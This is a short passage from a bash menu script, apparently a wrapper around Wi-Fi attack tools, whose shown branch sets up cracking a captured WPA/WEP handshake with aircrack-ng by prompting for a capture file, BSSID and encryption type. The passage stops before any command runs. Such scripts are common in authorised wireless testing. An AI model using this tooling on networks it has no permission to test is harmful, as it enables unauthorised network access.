fi







if [ $choix = "crh" ]
then
clear
echo ------------------
echo   crack handshake
echo  - aircrack-ng -
echo ------------------
echo file.cap
read -p 'file : ' capcr
echo
echo bssid of ap
echo
read -p 'bssid : ' bssidcr
echo
echo wep :1  or wpa:2
echo
